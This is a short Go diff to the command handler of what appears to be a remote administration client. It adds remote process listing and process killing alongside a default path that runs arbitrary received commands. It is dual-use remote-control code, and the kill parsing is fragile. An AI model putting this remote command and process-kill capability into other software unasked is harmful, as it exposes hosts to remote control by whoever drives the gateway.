@@ -10,6 +10,8 @@ import (
 	"noah/client/app/utils/encode"
 	"os"
 	"os/exec"
+	"strconv"
+	"strings"
 	"time"
 
 	"noah/client/app/gateway"
@@ -276,12 +278,23 @@ func (h *Handler) HandleCommand() {
 				}
 			}
 		case "process":
-			process, err := h.Services.Information.GetProcessList()
-			if err != nil {
-				hasError = true
-				response = encode.StringToByte(err.Error())
+			p := request.Parameter
+			if p == "list" {
+				process, err := h.Services.Terminal.GetProcessList()
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+				response = encode.StringToByte(encode.PrettyJson(process))
 			}
-			response = encode.StringToByte(encode.PrettyJson(process))
+			if strings.Contains(p, "kill") {
+				pid, _ := strconv.Atoi(strings.Split(p, " ")[1])
+				err := h.Services.Terminal.KillProcess(int32(pid))
+				if err != nil {
+					hasError = true
+					response = encode.StringToByte(err.Error())
+				}
+			}
 		default:
 			response, err = h.RunCommand(request.Command)
 			if err != nil {
